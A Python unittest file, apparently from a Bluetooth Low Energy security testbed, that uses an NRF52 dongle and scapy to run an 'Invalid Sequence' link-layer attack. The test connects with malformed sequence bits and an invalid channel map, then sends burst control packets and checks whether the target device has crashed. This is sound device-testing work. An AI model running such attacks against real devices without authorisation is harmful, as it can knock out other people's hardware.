#!/usr/bin/env python

""" Test suite """

from __future__ import print_function
import sys
import unittest
from mongodb_database.connect_mongodb import *
import core.ble as ble
import core.config as config
from core.logging_utils import *
from drivers.NRF52_dongle import NRF52Dongle
from scapy.layers.bluetooth4LE import *

from sql_database.connect import insert_data_to_link_layer_tests

log = logging.getLogger(__name__)


class Test_LL_INVALID_SEQUENCE(unittest.TestCase):
    """ Negative Tests for invalid sequence """

    @classmethod
    def setUpClass(cls):
        c = config.loadConfig()
        attack='Invalid Sequence'
        cls.comPortNRF = c['TESTBED']['COM_PORT_NRF']
        cls.advertiser_address = c['TESTBED']['ADVERTISER_ADDRESS']
        cls.master_address = c['TESTBED']['MASTER_ADDRESS']
        cls.access_address = int(c['TESTBED']['ACCESS_ADDRESS'], 16)
        cls.connection = c['TESTBED']['CONNECTION_TO_DATABASE']
        log.info('Advertiser Address: ' + cls.advertiser_address.upper())
        # Open serial port of NRF52 Dongle
        cls.driver = NRF52Dongle(cls.comPortNRF, '115200')
        date = str(datetime.datetime.today()).split()[0].encode('ascii', 'ignore')

        # Choose from test.conf file  type of database to insert data
        if str(c['TESTBED']['DATABASE_VERSION']) == 'SQL':
            insert_data_to_link_layer_tests(cls.advertiser_address, cls.master_address, cls.access_address, date,
                                            attack, cls.comPortNRF)

        elif str(c['TESTBED']['DATABASE_VERSION']) == 'MONGODB':
            client = insert_data_to_collection_info_tests(attack)
            close_connection_to_database(client)


        elif str(c['TESTBED']['DATABASE_VERSION']) == 'BOTH':
            insert_data_to_link_layer_tests(cls.advertiser_address, cls.master_address, cls.access_address, date,
                                            attack, cls.comPortNRF)
            client = insert_data_to_collection_info_tests(attack)
            close_connection_to_database(client)


        else:
            print('Continue with no database')
            pass

    def setUp(self):
        pass

    def tearDown(self):
        pass

    @classmethod
    def tearDownClass(cls):
        cls.driver.close()

    def test_link_layer_LL_INVALID_SEQUENCE_001(self):
        """"Test with invalid sequense"""

        log.info("Test with invalid sequence ")
        connecting = False
        none_count = 0
        payload_sent = False
        self.driver.set_log_tx(1) #retransmit packets
        # Send scan request
        scan_req = BTLE() / BTLE_ADV(RxAdd=0) / BTLE_SCAN_REQ(
            ScanA=self.master_address,
            AdvA=self.advertiser_address)
        self.driver.send(scan_req)
        log.info('Waiting advertisements from ' + self.advertiser_address)
        while True:
            pkt = None
            # Receive packet from the NRF52 Dongle
            data = self.driver.raw_receive()
            if data:
                # Decode Bluetooth Low Energy Data
                pkt = BTLE(data)
                # if packet is incorrectly decoded, you may not be using the dongle
                if pkt is None:
                    none_count += 1
                    if none_count >= 4:
                        print('NRF52 Dongle not detected')
                        sys.exit(0)
                    continue
                # --------------- Process Link Layer Packets here ------------------------------------
                # Check if packet from advertised is received
                if pkt and (BTLE_SCAN_RSP in pkt or BTLE_ADV_IND in pkt) and pkt.AdvA == self.advertiser_address.lower() \
                        and not connecting:

                    log.info(self.advertiser_address.upper() + ': ' + pkt.summary()[7:] + ' Detected')
                    connecting = True
                    payload_sent = False
                    slave_txaddr = pkt.TxAdd
                    conn_request = BTLE() / BTLE_ADV(RxAdd=slave_txaddr, TxAdd=0) / BTLE_CONNECT_REQ(
                        InitA=self.master_address,
                        AdvA=self.advertiser_address,
                        AA=self.access_address,  # Access address (any)
                        crc_init=0x179a9c,  # CRC init (any)
                        win_size=2,  # 2.5 of windows size (anchor connection window size)
                        win_offset=1,  # 1.25ms windows offset (anchor connection point)
                        interval=16,  # 20ms connection interval
                        latency=0,  # Slave latency (any)
                        timeout=25,  # Supervision timeout, 250ms (any)
                        chM=0x1FFFFFFFFF,  # Invalid channel map
                        hop=5,  # Hop increment (any)
                        SCA=0,  # Clock tolerance
                    )

                    #Set SN and NESN
                    self.driver.set_nesn(1)
                    self.driver.set_sn(1)
                    self.driver.send(conn_request)  # Send connection request to advertiser
                    log.info( 'Invalid sequence attack started, initial ACK bits set to 1')


                elif BTLE_DATA in pkt:
                    log.info('Slave Connected (L2Cap channel established)')
                    if BTLE_EMPTY_PDU not in pkt:
                        log.info( "Slave RX <--- " + pkt.summary()[7:] )

                    # The driver will automatically retransmit packets if the peripheral fails to send the correct ack
                    # Generally, the peripheral will not respond to repeated retransmissions of step

                    if not payload_sent:
                        payload_sent = True
                        # The attack attempts to send multiple packets while initiating the anchor point with nesn and sn set to 1
                        # 1) Send Feature request
                        pkt = BTLE(access_addr=self.access_address) / BTLE_DATA() / CtrlPDU() / LL_FEATURE_RSP(
                            feature_set='le_encryption+le_data_len_ext')
                        self.driver.send(pkt)
                        # 2) Send version ind request
                        pkt = BTLE(access_addr=self.access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')
                        self.driver.send(pkt)
                        # 3) Send length request
                        pkt = BTLE(access_addr=self.access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_REQ(
                            max_tx_bytes=251, max_rx_bytes=251)
                        self.driver.send(pkt)
                        # 4) Send ATT MTU Request
                        pkt = BTLE(access_addr=self.access_address) / \
                              BTLE_DATA() / L2CAP_Hdr() / ble.ATT_Hdr() / ble.ATT_Exchange_MTU_Request(mtu=247)
                        self.driver.send(pkt)
                        pulse = ble.check_pulse_via_scan(self.driver, self.master_address,self.advertiser_address)
                        self.assertTrue(pulse, "Device did not repsond to provisioning. Presumed dead....")
                        break


        log.info('Test Completed.')


